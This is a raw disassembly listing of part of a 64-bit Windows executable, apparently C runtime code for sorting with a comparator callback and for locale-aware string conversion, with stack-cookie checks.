   14000a9d2:	49 3b ff             	cmp    %r15,%rdi
   14000a9d5:	76 d9                	jbe    0x14000a9b0
   14000a9d7:	4d 8b c6             	mov    %r14,%r8
   14000a9da:	49 8b d7             	mov    %r15,%rdx
   14000a9dd:	49 3b df             	cmp    %r15,%rbx
   14000a9e0:	74 24                	je     0x14000aa06
   14000a9e2:	49 2b df             	sub    %r15,%rbx
   14000a9e5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000a9ec:	00 00 00 00 
   14000a9f0:	0f b6 02             	movzbl (%rdx),%eax
   14000a9f3:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
   14000a9f7:	88 04 13             	mov    %al,(%rbx,%rdx,1)
   14000a9fa:	88 0a                	mov    %cl,(%rdx)
   14000a9fc:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000aa00:	49 83 e8 01          	sub    $0x1,%r8
   14000aa04:	75 ea                	jne    0x14000a9f0
   14000aa06:	4d 2b fe             	sub    %r14,%r15
   14000aa09:	4d 3b fd             	cmp    %r13,%r15
   14000aa0c:	77 94                	ja     0x14000a9a2
   14000aa0e:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000aa13:	48 83 e9 01          	sub    $0x1,%rcx
   14000aa17:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000aa1c:	0f 88 86 02 00 00    	js     0x14000aca8
   14000aa22:	4c 8b 6c cc 30       	mov    0x30(%rsp,%rcx,8),%r13
   14000aa27:	4c 8b bc cc 20 02 00 	mov    0x220(%rsp,%rcx,8),%r15
   14000aa2e:	00 
   14000aa2f:	e9 4c ff ff ff       	jmp    0x14000a980
   14000aa34:	48 d1 eb             	shr    $1,%rbx
   14000aa37:	49 0f af de          	imul   %r14,%rbx
   14000aa3b:	4a 8d 34 2b          	lea    (%rbx,%r13,1),%rsi
   14000aa3f:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000aa46:	b7 75 93 
   14000aa49:	48 8b d6             	mov    %rsi,%rdx
   14000aa4c:	49 8b cd             	mov    %r13,%rcx
   14000aa4f:	49 8b c4             	mov    %r12,%rax
   14000aa52:	ff 15 10 48 00 00    	call   *0x4810(%rip)        # 0x14000f268
   14000aa58:	85 c0                	test   %eax,%eax
   14000aa5a:	7e 2f                	jle    0x14000aa8b
   14000aa5c:	4d 8b ce             	mov    %r14,%r9
   14000aa5f:	4c 8b c6             	mov    %rsi,%r8
   14000aa62:	4c 3b ee             	cmp    %rsi,%r13
   14000aa65:	74 24                	je     0x14000aa8b
   14000aa67:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000aa6e:	00 00 
   14000aa70:	41 0f b6 00          	movzbl (%r8),%eax
   14000aa74:	49 8b d0             	mov    %r8,%rdx
   14000aa77:	48 2b d3             	sub    %rbx,%rdx
   14000aa7a:	0f b6 0a             	movzbl (%rdx),%ecx
   14000aa7d:	88 02                	mov    %al,(%rdx)
   14000aa7f:	41 88 08             	mov    %cl,(%r8)
   14000aa82:	49 ff c0             	inc    %r8
   14000aa85:	49 83 e9 01          	sub    $0x1,%r9
   14000aa89:	75 e5                	jne    0x14000aa70
   14000aa8b:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000aa92:	b7 75 93 
   14000aa95:	49 8b d7             	mov    %r15,%rdx
   14000aa98:	49 8b cd             	mov    %r13,%rcx
   14000aa9b:	49 8b c4             	mov    %r12,%rax
   14000aa9e:	ff 15 c4 47 00 00    	call   *0x47c4(%rip)        # 0x14000f268
   14000aaa4:	85 c0                	test   %eax,%eax
   14000aaa6:	7e 30                	jle    0x14000aad8
   14000aaa8:	4d 8b c6             	mov    %r14,%r8
   14000aaab:	49 8b d7             	mov    %r15,%rdx
   14000aaae:	4d 3b ef             	cmp    %r15,%r13
   14000aab1:	74 25                	je     0x14000aad8
   14000aab3:	4d 8b cd             	mov    %r13,%r9
   14000aab6:	4d 2b cf             	sub    %r15,%r9
   14000aab9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000aac0:	0f b6 02             	movzbl (%rdx),%eax
   14000aac3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000aac8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000aacc:	88 0a                	mov    %cl,(%rdx)
   14000aace:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000aad2:	49 83 e8 01          	sub    $0x1,%r8
   14000aad6:	75 e8                	jne    0x14000aac0
   14000aad8:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000aadf:	b7 75 93 
   14000aae2:	49 8b d7             	mov    %r15,%rdx
   14000aae5:	48 8b ce             	mov    %rsi,%rcx
   14000aae8:	49 8b c4             	mov    %r12,%rax
   14000aaeb:	ff 15 77 47 00 00    	call   *0x4777(%rip)        # 0x14000f268
   14000aaf1:	85 c0                	test   %eax,%eax
   14000aaf3:	7e 33                	jle    0x14000ab28
   14000aaf5:	4d 8b c6             	mov    %r14,%r8
   14000aaf8:	49 8b d7             	mov    %r15,%rdx
   14000aafb:	49 3b f7             	cmp    %r15,%rsi
   14000aafe:	74 28                	je     0x14000ab28
   14000ab00:	4c 8b ce             	mov    %rsi,%r9
   14000ab03:	4d 2b cf             	sub    %r15,%r9
   14000ab06:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ab0d:	00 00 00 
   14000ab10:	0f b6 02             	movzbl (%rdx),%eax
   14000ab13:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000ab18:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000ab1c:	88 0a                	mov    %cl,(%rdx)
   14000ab1e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000ab22:	49 83 e8 01          	sub    $0x1,%r8
   14000ab26:	75 e8                	jne    0x14000ab10
   14000ab28:	49 8b dd             	mov    %r13,%rbx
   14000ab2b:	49 8b ff             	mov    %r15,%rdi
   14000ab2e:	66 90                	xchg   %ax,%ax
   14000ab30:	48 3b f3             	cmp    %rbx,%rsi
   14000ab33:	76 2b                	jbe    0x14000ab60
   14000ab35:	49 03 de             	add    %r14,%rbx
   14000ab38:	48 3b de             	cmp    %rsi,%rbx
   14000ab3b:	73 23                	jae    0x14000ab60
   14000ab3d:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000ab44:	b7 75 93 
   14000ab47:	48 8b d6             	mov    %rsi,%rdx
   14000ab4a:	48 8b cb             	mov    %rbx,%rcx
   14000ab4d:	49 8b c4             	mov    %r12,%rax
   14000ab50:	ff 15 12 47 00 00    	call   *0x4712(%rip)        # 0x14000f268
   14000ab56:	85 c0                	test   %eax,%eax
   14000ab58:	7e db                	jle    0x14000ab35
   14000ab5a:	eb 29                	jmp    0x14000ab85
   14000ab5c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000ab60:	49 03 de             	add    %r14,%rbx
   14000ab63:	49 3b df             	cmp    %r15,%rbx
   14000ab66:	77 1d                	ja     0x14000ab85
   14000ab68:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000ab6f:	b7 75 93 
   14000ab72:	48 8b d6             	mov    %rsi,%rdx
   14000ab75:	48 8b cb             	mov    %rbx,%rcx
   14000ab78:	49 8b c4             	mov    %r12,%rax
   14000ab7b:	ff 15 e7 46 00 00    	call   *0x46e7(%rip)        # 0x14000f268
   14000ab81:	85 c0                	test   %eax,%eax
   14000ab83:	7e db                	jle    0x14000ab60
   14000ab85:	48 8b ef             	mov    %rdi,%rbp
   14000ab88:	49 2b fe             	sub    %r14,%rdi
   14000ab8b:	48 3b fe             	cmp    %rsi,%rdi
   14000ab8e:	76 1d                	jbe    0x14000abad
   14000ab90:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000ab97:	b7 75 93 
   14000ab9a:	48 8b d6             	mov    %rsi,%rdx
   14000ab9d:	48 8b cf             	mov    %rdi,%rcx
   14000aba0:	49 8b c4             	mov    %r12,%rax
   14000aba3:	ff 15 bf 46 00 00    	call   *0x46bf(%rip)        # 0x14000f268
   14000aba9:	85 c0                	test   %eax,%eax
   14000abab:	7f d8                	jg     0x14000ab85
   14000abad:	48 3b fb             	cmp    %rbx,%rdi
   14000abb0:	72 38                	jb     0x14000abea
   14000abb2:	4d 8b c6             	mov    %r14,%r8
   14000abb5:	48 8b d7             	mov    %rdi,%rdx
   14000abb8:	74 1e                	je     0x14000abd8
   14000abba:	4c 8b cb             	mov    %rbx,%r9
   14000abbd:	4c 2b cf             	sub    %rdi,%r9
   14000abc0:	0f b6 02             	movzbl (%rdx),%eax
   14000abc3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000abc8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000abcc:	88 0a                	mov    %cl,(%rdx)
   14000abce:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000abd2:	49 83 e8 01          	sub    $0x1,%r8
   14000abd6:	75 e8                	jne    0x14000abc0
   14000abd8:	48 3b f7             	cmp    %rdi,%rsi
   14000abdb:	48 8b c3             	mov    %rbx,%rax
   14000abde:	48 0f 45 c6          	cmovne %rsi,%rax
   14000abe2:	48 8b f0             	mov    %rax,%rsi
   14000abe5:	e9 46 ff ff ff       	jmp    0x14000ab30
   14000abea:	48 3b f5             	cmp    %rbp,%rsi
   14000abed:	73 28                	jae    0x14000ac17
   14000abef:	90                   	nop
   14000abf0:	49 2b ee             	sub    %r14,%rbp
   14000abf3:	48 3b ee             	cmp    %rsi,%rbp
   14000abf6:	76 1f                	jbe    0x14000ac17
   14000abf8:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000abff:	b7 75 93 
   14000ac02:	48 8b d6             	mov    %rsi,%rdx
   14000ac05:	48 8b cd             	mov    %rbp,%rcx
   14000ac08:	49 8b c4             	mov    %r12,%rax
   14000ac0b:	ff 15 57 46 00 00    	call   *0x4657(%rip)        # 0x14000f268
   14000ac11:	85 c0                	test   %eax,%eax
   14000ac13:	74 db                	je     0x14000abf0
   14000ac15:	eb 25                	jmp    0x14000ac3c
   14000ac17:	49 2b ee             	sub    %r14,%rbp
   14000ac1a:	49 3b ed             	cmp    %r13,%rbp
   14000ac1d:	76 1d                	jbe    0x14000ac3c
   14000ac1f:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000ac26:	b7 75 93 
   14000ac29:	48 8b d6             	mov    %rsi,%rdx
   14000ac2c:	48 8b cd             	mov    %rbp,%rcx
   14000ac2f:	49 8b c4             	mov    %r12,%rax
   14000ac32:	ff 15 30 46 00 00    	call   *0x4630(%rip)        # 0x14000f268
   14000ac38:	85 c0                	test   %eax,%eax
   14000ac3a:	74 db                	je     0x14000ac17
   14000ac3c:	49 8b cf             	mov    %r15,%rcx
   14000ac3f:	48 8b c5             	mov    %rbp,%rax
   14000ac42:	48 2b cb             	sub    %rbx,%rcx
   14000ac45:	49 2b c5             	sub    %r13,%rax
   14000ac48:	48 3b c1             	cmp    %rcx,%rax
   14000ac4b:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000ac50:	7c 2b                	jl     0x14000ac7d
   14000ac52:	4c 3b ed             	cmp    %rbp,%r13
   14000ac55:	73 15                	jae    0x14000ac6c
   14000ac57:	4c 89 6c cc 30       	mov    %r13,0x30(%rsp,%rcx,8)
   14000ac5c:	48 89 ac cc 20 02 00 	mov    %rbp,0x220(%rsp,%rcx,8)
   14000ac63:	00 
   14000ac64:	48 ff c1             	inc    %rcx
   14000ac67:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000ac6c:	49 3b df             	cmp    %r15,%rbx
   14000ac6f:	0f 83 9e fd ff ff    	jae    0x14000aa13
   14000ac75:	4c 8b eb             	mov    %rbx,%r13
   14000ac78:	e9 03 fd ff ff       	jmp    0x14000a980
   14000ac7d:	49 3b df             	cmp    %r15,%rbx
   14000ac80:	73 15                	jae    0x14000ac97
   14000ac82:	48 89 5c cc 30       	mov    %rbx,0x30(%rsp,%rcx,8)
   14000ac87:	4c 89 bc cc 20 02 00 	mov    %r15,0x220(%rsp,%rcx,8)
   14000ac8e:	00 
   14000ac8f:	48 ff c1             	inc    %rcx
   14000ac92:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000ac97:	4c 3b ed             	cmp    %rbp,%r13
   14000ac9a:	0f 83 73 fd ff ff    	jae    0x14000aa13
   14000aca0:	4c 8b fd             	mov    %rbp,%r15
   14000aca3:	e9 d8 fc ff ff       	jmp    0x14000a980
   14000aca8:	48 8b bc 24 30 04 00 	mov    0x430(%rsp),%rdi
   14000acaf:	00 
   14000acb0:	48 8b b4 24 38 04 00 	mov    0x438(%rsp),%rsi
   14000acb7:	00 
   14000acb8:	48 8b ac 24 40 04 00 	mov    0x440(%rsp),%rbp
   14000acbf:	00 
   14000acc0:	48 8b 9c 24 48 04 00 	mov    0x448(%rsp),%rbx
   14000acc7:	00 
   14000acc8:	4c 8b bc 24 28 04 00 	mov    0x428(%rsp),%r15
   14000accf:	00 
   14000acd0:	48 8b 8c 24 10 04 00 	mov    0x410(%rsp),%rcx
   14000acd7:	00 
   14000acd8:	48 33 cc             	xor    %rsp,%rcx
   14000acdb:	e8 b0 2d 00 00       	call   0x14000da90
   14000ace0:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   14000ace7:	41 5e                	pop    %r14
   14000ace9:	41 5d                	pop    %r13
   14000aceb:	41 5c                	pop    %r12
   14000aced:	c3                   	ret
   14000acee:	cc                   	int3
   14000acef:	cc                   	int3
   14000acf0:	40 55                	rex push %rbp
   14000acf2:	41 54                	push   %r12
   14000acf4:	41 55                	push   %r13
   14000acf6:	41 56                	push   %r14
   14000acf8:	41 57                	push   %r15
   14000acfa:	48 83 ec 60          	sub    $0x60,%rsp
   14000acfe:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000ad03:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   14000ad07:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   14000ad0b:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   14000ad0f:	48 8b 05 2a e3 00 00 	mov    0xe32a(%rip),%rax        # 0x140019040
   14000ad16:	48 33 c5             	xor    %rbp,%rax
   14000ad19:	48 89 45 08          	mov    %rax,0x8(%rbp)
   14000ad1d:	48 63 75 60          	movslq 0x60(%rbp),%rsi
   14000ad21:	4d 8b e1             	mov    %r9,%r12
   14000ad24:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   14000ad28:	45 8b e8             	mov    %r8d,%r13d
   14000ad2b:	48 8b d9             	mov    %rcx,%rbx
   14000ad2e:	85 f6                	test   %esi,%esi
   14000ad30:	7e 14                	jle    0x14000ad46
   14000ad32:	48 8b d6             	mov    %rsi,%rdx
   14000ad35:	49 8b c9             	mov    %r9,%rcx
   14000ad38:	e8 df 15 00 00       	call   0x14000c31c
   14000ad3d:	3b c6                	cmp    %esi,%eax
   14000ad3f:	8d 70 01             	lea    0x1(%rax),%esi
   14000ad42:	7c 02                	jl     0x14000ad46
   14000ad44:	8b f0                	mov    %eax,%esi
   14000ad46:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   14000ad4a:	45 85 f6             	test   %r14d,%r14d
   14000ad4d:	75 07                	jne    0x14000ad56
   14000ad4f:	48 8b 03             	mov    (%rbx),%rax
   14000ad52:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   14000ad56:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   14000ad5c:	44 8b ce             	mov    %esi,%r9d
   14000ad5f:	4d 8b c4             	mov    %r12,%r8
   14000ad62:	41 8b ce             	mov    %r14d,%ecx
   14000ad65:	1b d2                	sbb    %edx,%edx
   14000ad67:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000ad6c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000ad72:	83 e2 08             	and    $0x8,%edx
   14000ad75:	ff c2                	inc    %edx
   14000ad77:	e8 3c d9 ff ff       	call   0x1400086b8
   14000ad7c:	4c 63 f8             	movslq %eax,%r15
   14000ad7f:	85 c0                	test   %eax,%eax
   14000ad81:	0f 84 62 02 00 00    	je     0x14000afe9
   14000ad87:	49 8b c7             	mov    %r15,%rax
   14000ad8a:	48 03 c0             	add    %rax,%rax
   14000ad8d:	48 8d 48 10          	lea    0x10(%rax),%rcx
   14000ad91:	48 3b c1             	cmp    %rcx,%rax
   14000ad94:	48 1b c0             	sbb    %rax,%rax
   14000ad97:	48 23 c1             	and    %rcx,%rax
   14000ad9a:	0f 84 2d 02 00 00    	je     0x14000afcd
   14000ada0:	48 ba f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rdx
   14000ada7:	ff ff 0f 
   14000adaa:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   14000adb0:	77 2d                	ja     0x14000addf
   14000adb2:	48 8d 48 0f          	lea    0xf(%rax),%rcx
   14000adb6:	48 3b c8             	cmp    %rax,%rcx
   14000adb9:	77 03                	ja     0x14000adbe
   14000adbb:	48 8b ca             	mov    %rdx,%rcx
   14000adbe:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000adc2:	48 8b c1             	mov    %rcx,%rax
   14000adc5:	e8 86 2e 00 00       	call   0x14000dc50
   14000adca:	48 2b e1             	sub    %rcx,%rsp
   14000adcd:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   14000add2:	48 85 ff             	test   %rdi,%rdi
   14000add5:	74 22                	je     0x14000adf9
   14000add7:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   14000addd:	eb 16                	jmp    0x14000adf5
   14000addf:	48 8b c8             	mov    %rax,%rcx
   14000ade2:	e8 d5 e3 ff ff       	call   0x1400091bc
   14000ade7:	48 8b f8             	mov    %rax,%rdi
   14000adea:	48 85 c0             	test   %rax,%rax
   14000aded:	74 0a                	je     0x14000adf9
   14000adef:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000adf5:	48 83 c7 10          	add    $0x10,%rdi
   14000adf9:	48 8b df             	mov    %rdi,%rbx
   14000adfc:	48 85 ff             	test   %rdi,%rdi
   14000adff:	0f 84 ca 01 00 00    	je     0x14000afcf
   14000ae05:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000ae0a:	44 8b ce             	mov    %esi,%r9d
   14000ae0d:	4d 8b c4             	mov    %r12,%r8
   14000ae10:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000ae15:	ba 01 00 00 00       	mov    $0x1,%edx
   14000ae1a:	41 8b ce             	mov    %r14d,%ecx
   14000ae1d:	e8 96 d8 ff ff       	call   0x1400086b8
   14000ae22:	85 c0                	test   %eax,%eax
   14000ae24:	0f 84 a5 01 00 00    	je     0x14000afcf
   14000ae2a:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000ae30:	45 8b cf             	mov    %r15d,%r9d
   14000ae33:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000ae39:	4c 8b c7             	mov    %rdi,%r8
   14000ae3c:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000ae42:	41 8b d5             	mov    %r13d,%edx
   14000ae45:	4c 8b 65 00          	mov    0x0(%rbp),%r12
   14000ae49:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000ae4e:	49 8b cc             	mov    %r12,%rcx
   14000ae51:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000ae57:	e8 44 ec ff ff       	call   0x140009aa0
   14000ae5c:	48 63 f0             	movslq %eax,%rsi
   14000ae5f:	85 c0                	test   %eax,%eax
   14000ae61:	0f 84 68 01 00 00    	je     0x14000afcf
   14000ae67:	ba 00 04 00 00       	mov    $0x400,%edx
   14000ae6c:	44 85 ea             	test   %r13d,%edx
   14000ae6f:	74 52                	je     0x14000aec3
   14000ae71:	8b 45 70             	mov    0x70(%rbp),%eax
   14000ae74:	85 c0                	test   %eax,%eax
   14000ae76:	0f 84 2a 01 00 00    	je     0x14000afa6
   14000ae7c:	3b f0                	cmp    %eax,%esi
   14000ae7e:	0f 8f 4b 01 00 00    	jg     0x14000afcf
   14000ae84:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000ae8a:	45 8b cf             	mov    %r15d,%r9d
   14000ae8d:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000ae93:	4c 8b c7             	mov    %rdi,%r8
   14000ae96:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000ae9c:	41 8b d5             	mov    %r13d,%edx
   14000ae9f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000aea3:	49 8b cc             	mov    %r12,%rcx
   14000aea6:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000aeaa:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000aeaf:	e8 ec eb ff ff       	call   0x140009aa0
   14000aeb4:	8b f0                	mov    %eax,%esi
   14000aeb6:	85 c0                	test   %eax,%eax
   14000aeb8:	0f 85 e8 00 00 00    	jne    0x14000afa6
   14000aebe:	e9 0c 01 00 00       	jmp    0x14000afcf
   14000aec3:	48 8b ce             	mov    %rsi,%rcx
   14000aec6:	48 03 c9             	add    %rcx,%rcx
   14000aec9:	48 8d 41 10          	lea    0x10(%rcx),%rax
   14000aecd:	48 3b c8             	cmp    %rax,%rcx
   14000aed0:	48 1b c9             	sbb    %rcx,%rcx
   14000aed3:	48 23 c8             	and    %rax,%rcx
   14000aed6:	0f 84 c8 00 00 00    	je     0x14000afa4
   14000aedc:	48 3b ca             	cmp    %rdx,%rcx
   14000aedf:	77 35                	ja     0x14000af16
   14000aee1:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000aee5:	48 3b c1             	cmp    %rcx,%rax
   14000aee8:	77 0a                	ja     0x14000aef4
   14000aeea:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000aef1:	ff ff 0f 
   14000aef4:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000aef8:	e8 53 2d 00 00       	call   0x14000dc50
   14000aefd:	48 2b e0             	sub    %rax,%rsp
   14000af00:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   14000af05:	48 85 db             	test   %rbx,%rbx
   14000af08:	0f 84 96 00 00 00    	je     0x14000afa4
   14000af0e:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000af14:	eb 13                	jmp    0x14000af29
   14000af16:	e8 a1 e2 ff ff       	call   0x1400091bc
   14000af1b:	48 8b d8             	mov    %rax,%rbx
   14000af1e:	48 85 c0             	test   %rax,%rax
   14000af21:	74 0a                	je     0x14000af2d
   14000af23:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000af29:	48 83 c3 10          	add    $0x10,%rbx
   14000af2d:	48 85 db             	test   %rbx,%rbx
   14000af30:	74 72                	je     0x14000afa4
   14000af32:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000af38:	45 8b cf             	mov    %r15d,%r9d
   14000af3b:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000af41:	4c 8b c7             	mov    %rdi,%r8
   14000af44:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000af4a:	41 8b d5             	mov    %r13d,%edx
   14000af4d:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000af51:	49 8b cc             	mov    %r12,%rcx
   14000af54:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000af59:	e8 42 eb ff ff       	call   0x140009aa0
   14000af5e:	85 c0                	test   %eax,%eax
   14000af60:	74 31                	je     0x14000af93
   14000af62:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000af68:	33 d2                	xor    %edx,%edx
   14000af6a:	48 21 54 24 30       	and    %rdx,0x30(%rsp)
   14000af6f:	44 8b ce             	mov    %esi,%r9d
   14000af72:	8b 45 70             	mov    0x70(%rbp),%eax
   14000af75:	4c 8b c3             	mov    %rbx,%r8
   14000af78:	41 8b ce             	mov    %r14d,%ecx
   14000af7b:	85 c0                	test   %eax,%eax
   14000af7d:	75 2c                	jne    0x14000afab
   14000af7f:	21 54 24 28          	and    %edx,0x28(%rsp)
   14000af83:	48 21 54 24 20       	and    %rdx,0x20(%rsp)
   14000af88:	e8 87 d7 ff ff       	call   0x140008714
   14000af8d:	8b f0                	mov    %eax,%esi
   14000af8f:	85 c0                	test   %eax,%eax
   14000af91:	75 27                	jne    0x14000afba
   14000af93:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000af97:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000af9d:	75 05                	jne    0x14000afa4
   14000af9f:	e8 48 c5 ff ff       	call   0x1400074ec
   14000afa4:	33 f6                	xor    %esi,%esi
   14000afa6:	48 8b df             	mov    %rdi,%rbx
   14000afa9:	eb 2b                	jmp    0x14000afd6
   14000afab:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000afaf:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000afb3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000afb8:	eb ce                	jmp    0x14000af88
   14000afba:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000afbe:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000afc4:	75 e0                	jne    0x14000afa6
   14000afc6:	e8 21 c5 ff ff       	call   0x1400074ec
   14000afcb:	eb d9                	jmp    0x14000afa6
   14000afcd:	33 db                	xor    %ebx,%ebx
   14000afcf:	33 f6                	xor    %esi,%esi
   14000afd1:	48 85 db             	test   %rbx,%rbx
   14000afd4:	74 11                	je     0x14000afe7
   14000afd6:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000afda:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000afe0:	75 05                	jne    0x14000afe7
   14000afe2:	e8 05 c5 ff ff       	call   0x1400074ec
   14000afe7:	8b c6                	mov    %esi,%eax
   14000afe9:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   14000afed:	48 33 cd             	xor    %rbp,%rcx
   14000aff0:	e8 9b 2a 00 00       	call   0x14000da90
   14000aff5:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   14000aff9:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   14000affd:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   14000b001:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   14000b005:	41 5f                	pop    %r15
   14000b007:	41 5e                	pop    %r14
   14000b009:	41 5d                	pop    %r13
   14000b00b:	41 5c                	pop    %r12
   14000b00d:	5d                   	pop    %rbp
   14000b00e:	c3                   	ret
   14000b00f:	cc                   	int3
   14000b010:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b015:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b01a:	57                   	push   %rdi
   14000b01b:	48 83 ec 70          	sub    $0x70,%rsp
   14000b01f:	48 8b f2             	mov    %rdx,%rsi
   14000b022:	49 8b d9             	mov    %r9,%rbx
   14000b025:	48 8b d1             	mov    %rcx,%rdx
   14000b028:	41 8b f8             	mov    %r8d,%edi
   14000b02b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000b030:	e8 83 ca ff ff       	call   0x140007ab8
   14000b035:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   14000b03c:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000b041:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000b045:	4c 8b cb             	mov    %rbx,%r9
   14000b048:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   14000b04f:	44 8b c7             	mov    %edi,%r8d
   14000b052:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000b056:	48 8b d6             	mov    %rsi,%rdx
   14000b059:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000b060:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000b064:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   14000b06b:	00 
   14000b06c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000b071:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000b078:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000b07c:	e8 6f fc ff ff       	call   0x14000acf0
   14000b081:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   14000b086:	74 0c                	je     0x14000b094
   14000b088:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000b08d:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000b094:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000b099:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000b09d:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000b0a1:	49 8b e3             	mov    %r11,%rsp
   14000b0a4:	5f                   	pop    %rdi
   14000b0a5:	c3                   	ret
   14000b0a6:	cc                   	int3
   14000b0a7:	cc                   	int3
   14000b0a8:	48 83 ec 28          	sub    $0x28,%rsp
   14000b0ac:	e8 a3 d2 ff ff       	call   0x140008354
   14000b0b1:	33 c9                	xor    %ecx,%ecx
   14000b0b3:	84 c0                	test   %al,%al
   14000b0b5:	0f 94 c1             	sete   %cl
   14000b0b8:	8b c1                	mov    %ecx,%eax
   14000b0ba:	48 83 c4 28          	add    $0x28,%rsp
   14000b0be:	c3                   	ret
   14000b0bf:	cc                   	int3
